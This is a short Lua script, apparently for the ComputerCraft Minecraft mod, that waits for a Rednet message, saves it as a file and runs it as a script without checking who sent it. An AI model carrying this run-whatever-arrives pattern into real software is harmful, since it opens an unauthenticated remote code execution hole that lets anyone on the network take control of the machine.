-- enslavement.lua
-- Open the modem for Rednet communication
rednet.open("left") -- replace "left" with the side where the modem is located

-- Wait for a Rednet message
local senderID, message, protocol = rednet.receive()

-- Write the received message to a file
local file = fs.open("received_script.lua", "w")
file.write(message)
file.close()

-- Run the received script
shell.run("received_script.lua")
